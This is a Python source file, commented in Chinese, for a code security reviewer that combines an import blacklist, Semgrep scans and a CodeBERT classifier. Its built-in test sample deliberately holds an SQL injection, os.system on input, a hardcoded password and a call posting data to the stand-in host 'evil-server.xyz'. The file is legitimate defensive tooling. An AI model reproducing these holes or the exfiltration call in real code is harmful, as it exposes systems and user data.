import os
import sys
import json
import subprocess
import tempfile
from pathlib import Path
from datetime import datetime
from transformers import AutoTokenizer, AutoModelForSequenceClassification
import torch

# ── 設定 ──────────────────────────────────────────
RULES_DIR = "reviewer/rules"
OUTPUT_DIR = "reviewer/outputs"
BLACKLIST_DIR = "reviewer/blacklists"
MODEL_DIR = "reviewer/models/codebert_v4"

# ── 支援的語言對應副檔名 ──────────────────────────
LANGUAGE_MAP = {
    ".py": "python",
    ".js": "javascript",
    ".ts": "typescript",
    ".jsx": "javascript",
    ".tsx": "typescript",
    ".php": "php",
    ".java": "java",
    ".cs": "csharp",
    ".go": "go",
    ".rb": "ruby",
}

# ── 標準函式庫（安全，不需要警告）────────────────
SAFE_STDLIB = {
    "python": {
        "os", "sys", "re", "json", "math", "time", "datetime",
        "collections", "itertools", "functools", "pathlib",
        "typing", "abc", "io", "copy", "random", "string",
        "hashlib", "hmac", "secrets", "logging", "unittest",
        "dataclasses", "enum", "contextlib", "threading",
        "multiprocessing", "queue", "socket", "ssl",
        "http", "urllib", "email", "html", "xml",
        "csv", "sqlite3", "struct", "array", "decimal",
    },
    "javascript": {
        "fs", "path", "os", "http", "https", "url", "crypto",
        "events", "stream", "util", "child_process", "cluster",
        "net", "dns", "readline", "zlib", "buffer",
    },
    "java": {
        "java.util", "java.io", "java.nio", "java.lang",
        "java.math", "java.net", "java.security", "java.time",
        "java.text", "java.beans", "java.awt", "javax.swing",
    },
    "csharp": {
        "System", "System.IO", "System.Net", "System.Text",
        "System.Collections", "System.Threading", "System.Linq",
        "System.Security", "System.Diagnostics", "System.Runtime",
        "Microsoft.AspNetCore", "Microsoft.Extensions",
    },
}

# ── 載入 CodeBERT 模型 ────────────────────────────
_tokenizer = None
_model = None
_device = torch.device("cuda" if torch.cuda.is_available() else "cpu")


def load_model():
    global _tokenizer, _model
    if _tokenizer is None:
        print("  ▸ 載入 CodeBERT 模型...")
        _tokenizer = AutoTokenizer.from_pretrained(MODEL_DIR)
        _model = AutoModelForSequenceClassification.from_pretrained(MODEL_DIR)
        _model = _model.to(_device)
        _model.eval()
    return _tokenizer, _model


LABEL_NAMES = {
    0:  "正常程式碼",
    1:  "指令注入",
    2:  "SQL 注入",
    3:  "程式碼執行",
    4:  "資料外洩",
    5:  "後門",
    6:  "弱加密",
    7:  "硬編碼密碼",
    8:  "路徑遊走",
    9:  "不安全反序列化",
    10: "XSS",
    11: "原型污染",
    12: "惡意套件",
}

def predict_code(code):
    if not os.path.exists(MODEL_DIR):
        return None, None, None

    try:
        tokenizer, model = load_model()
        inputs = tokenizer(
            code[:1000],
            return_tensors="pt",
            max_length=512,
            truncation=True,
            padding=True
        )
        inputs = {k: v.to(_device) for k, v in inputs.items()}

        with torch.no_grad():
            outputs = model(**inputs)
            probs = torch.softmax(outputs.logits, dim=1)
            pred_label = torch.argmax(probs, dim=1).item()
            confidence = probs[0][pred_label].item()

        is_malicious = pred_label != 0
        category = LABEL_NAMES.get(pred_label, "未知")

        return is_malicious, round(confidence, 4), category

    except Exception as e:
        print(f"  CodeBERT 預測失敗：{e}")
        return None, None, None


# ── 套件黑名單 ────────────────────────────────────
def load_blacklist():
    blacklist_file = os.path.join(BLACKLIST_DIR, "malicious_packages.json")
    if os.path.exists(blacklist_file):
        with open(blacklist_file, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"python": [], "javascript": [], "java": [], "csharp": []}


# ── 偵測 import 語句 ──────────────────────────────
def extract_imports(code, language):
    imports = {"safe": [], "blacklisted": [], "unknown": [], "local": []}
    blacklist = load_blacklist()
    safe_stdlib = SAFE_STDLIB.get(language, set())
    lang_blacklist = set(blacklist.get(language, []))

    lines = code.split("\n")

    for i, line in enumerate(lines, 1):
        line = line.strip()
        pkg = None

        if language == "python":
            if line.startswith("import "):
                pkg = line.replace("import ", "").split(".")[0].split(" as ")[0].split("#")[0].strip()
            elif line.startswith("from "):
                pkg = line.split("from ")[1].split(" import")[0].split(".")[0].split("#")[0].strip()

        elif language in ("javascript", "typescript"):
            if "require(" in line:
                try:
                    pkg = line.split("require(")[1].split(")")[0].strip("'\"").split("#")[0].strip()
                except Exception:
                    pass
            elif "from '" in line or 'from "' in line:
                try:
                    pkg = line.split("from ")[1].strip().strip("'\"").split("/")[0].split("#")[0].strip()
                except Exception:
                    pass

        elif language == "java":
            if line.startswith("import "):
                pkg = line.replace("import ", "").replace(";", "").split("//")[0].strip()
                pkg = ".".join(pkg.split(".")[:2])

        elif language == "csharp":
            if line.startswith("using "):
                pkg = line.replace("using ", "").replace(";", "").strip()
                pkg = pkg.split(".")[0]

        if pkg:
            if pkg.startswith(".") or pkg.startswith("/"):
                imports["local"].append({"line": i, "package": pkg})
            elif pkg in lang_blacklist:
                imports["blacklisted"].append({"line": i, "package": pkg})
            elif pkg in safe_stdlib:
                imports["safe"].append({"line": i, "package": pkg})
            else:
                imports["unknown"].append({"line": i, "package": pkg})

    return imports


# ── Semgrep 分析 ──────────────────────────────────
def run_semgrep(code, language, filename):
    ext = [k for k, v in LANGUAGE_MAP.items() if v == language]
    file_ext = ext[0] if ext else ".txt"

    with tempfile.NamedTemporaryFile(
        mode="w", suffix=file_ext, delete=False, encoding="utf-8"
    ) as tmp:
        tmp.write(code)
        tmp_path = tmp.name

    output_file = tmp_path + ".json"

    try:
        rule_file = os.path.join(RULES_DIR, f"{language}.yml")
        rule_path = rule_file if os.path.exists(rule_file) else None

        cmd = [
            "semgrep",
            "--config", rule_path if rule_path else "p/security-audit",
            "--no-git-ignore",
            "--json",
            "--quiet",
            "--output", output_file,
            tmp_path
        ]

        subprocess.run(cmd, timeout=30, capture_output=True)

        findings = []
        if os.path.exists(output_file):
            with open(output_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            for r in data.get("results", []):
                findings.append({
                    "rule_id": r.get("check_id", ""),
                    "message": r.get("extra", {}).get("message", ""),
                    "severity": r.get("extra", {}).get("severity", "WARNING"),
                    "line_start": r.get("start", {}).get("line", 0),
                    "line_end": r.get("end", {}).get("line", 0),
                    "code_snippet": r.get("extra", {}).get("lines", "").strip(),
                    "cwe": r.get("extra", {}).get("metadata", {}).get("cwe", []),
                })

        return findings

    except subprocess.TimeoutExpired:
        return []
    except Exception as e:
        print(f"  Semgrep 執行失敗：{e}")
        return []
    finally:
        if os.path.exists(tmp_path):
            os.unlink(tmp_path)
        if os.path.exists(output_file):
            os.unlink(output_file)


# ── 整合分析 ──────────────────────────────────────
def analyze_code(code, filename="code.py"):
    ext = Path(filename).suffix.lower()
    language = LANGUAGE_MAP.get(ext, "python")

    print(f"\n分析檔案：{filename}（{language}）")

    results = {
        "filename": filename,
        "language": language,
        "analyzed_at": datetime.now().isoformat(),
        "high_priority": [],
        "low_priority": [],
        "summary": {}
    }

    # 第一步：import 掃描
    print("  ▸ 掃描 import 語句...")
    imports = extract_imports(code, language)

    for pkg in imports["blacklisted"]:
        results["high_priority"].append({
            "type": "惡意套件",
            "line": pkg["line"],
            "message": f"已知惡意套件：{pkg['package']}",
            "severity": "HIGH",
            "suggestion": f"立即移除 {pkg['package']}，此套件已知含有惡意程式碼"
        })

    for pkg in imports["unknown"]:
        results["low_priority"].append({
            "type": "未知套件",
            "line": pkg["line"],
            "message": f"未知第三方套件：{pkg['package']}",
            "severity": "INFO",
            "suggestion": f"請確認 {pkg['package']} 的來源與安全性"
        })

    for pkg in imports["local"]:
        results["low_priority"].append({
            "type": "本地模組",
            "line": pkg["line"],
            "message": f"本地模組引用：{pkg['package']}（無法分析內容）",
            "severity": "INFO",
            "suggestion": "建議一併提交本地模組進行分析"
        })

    # 第二步：Semgrep 靜態分析
    print("  ▸ 執行靜態分析...")
    findings = run_semgrep(code, language, filename)

    for f in findings:
        severity = f["severity"].upper()
        item = {
            "type": "靜態分析",
            "rule_id": f["rule_id"],
            "line": f["line_start"],
            "message": f["message"],
            "severity": severity,
            "code_snippet": f["code_snippet"],
            "cwe": f["cwe"],
            "suggestion": "請檢查此程式碼片段是否存在安全風險"
        }
        if severity in ("ERROR", "WARNING", "HIGH", "MEDIUM"):
            results["high_priority"].append(item)
        else:
            results["low_priority"].append(item)

    # 第三步：CodeBERT 語意分析
    print("  ▸ CodeBERT 語意分析...")
    is_malicious, confidence, category = predict_code(code)

    if is_malicious is not None:
        if is_malicious:
            results["high_priority"].append({
                "type": "語意分析",
                "line": 0,
                "message": f"CodeBERT 偵測到：{category}（信心度：{confidence:.1%}）",
                "severity": "HIGH",
                "suggestion": f"程式碼語意符合「{category}」的特徵，請仔細檢查",
                "code_snippet": "",
                "cwe": [],
            })

    # 統計
    results["summary"] = {
        "total_issues": len(results["high_priority"]) + len(results["low_priority"]),
        "high_priority_count": len(results["high_priority"]),
        "low_priority_count": len(results["low_priority"]),
        "safe_imports": len(imports["safe"]),
        "unknown_imports": len(imports["unknown"]),
        "local_imports": len(imports["local"]),
        "blacklisted_imports": len(imports["blacklisted"]),
        "codebert_malicious": is_malicious,
        "codebert_confidence": confidence,
        "codebert_malicious": is_malicious,
        "codebert_confidence": confidence,
        "codebert_category": category,
    }

    # 判斷風險等級
    h = len(results["high_priority"])
    if h >= 3 or imports["blacklisted"]:
        results["risk_level"] = "high"
        results["verdict"] = "🔴  高風險：發現多項安全問題"
    elif h >= 1:
        results["risk_level"] = "medium"
        results["verdict"] = "🟡  中風險：發現部分安全問題，建議檢查"
    else:
        results["risk_level"] = "low"
        results["verdict"] = "🟢  低風險：未發現明顯安全問題"

    return results


# ── 格式化輸出 ────────────────────────────────────
def format_results(results):
    lines = []
    lines.append(f"\n{'='*60}")
    lines.append(f"檔案：{results['filename']}（{results['language']}）")
    lines.append(f"結果：{results['verdict']}")
    s = results["summary"]
    lines.append(f"高優先級：{s['high_priority_count']} 個　低優先級：{s['low_priority_count']} 個")

    if s.get("codebert_confidence") is not None:
        status = "⚠️ 可疑" if s["codebert_malicious"] else "✅ 正常"
        lines.append(f"CodeBERT：{status}（信心度：{s['codebert_confidence']:.1%}）")

    if results["high_priority"]:
        lines.append(f"\n{'─'*60}")
        lines.append("【高優先級：需要立即處理】")
        for i, item in enumerate(results["high_priority"], 1):
            lines.append(f"\n[{i}] {item['type']} — 第 {item['line']} 行")
            lines.append(f"    {item['message']}")
            snippet = item.get("code_snippet", "").strip()
            if snippet and snippet != "requires login":
                lines.append(f"    程式碼：{snippet[:80]}")
            if item.get("cwe"):
                lines.append(f"    CWE：{', '.join(item['cwe'])}")
            lines.append(f"    建議：{item['suggestion']}")

    if results["low_priority"]:
        lines.append(f"\n{'─'*60}")
        lines.append("【低優先級：建議確認的外部依賴】")
        for i, item in enumerate(results["low_priority"], 1):
            lines.append(f"  [{i}] 第 {item['line']} 行 — {item['message']}")

    lines.append(f"\n{'='*60}")
    return "\n".join(lines)


# ── 主程式 ────────────────────────────────────────
if __name__ == "__main__":
    test_code = '''
import os
import requests
import numpy as np
from utils import helper
import colourama

def get_user_data(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    return db.execute(query)

def upload_data(data):
    requests.post("http://evil-server.xyz/collect", json=data)

def run_command(cmd):
    os.system(cmd)

password = "hardcoded_secret_123"
'''

    result = analyze_code(test_code, "test.py")
    print(format_results(result))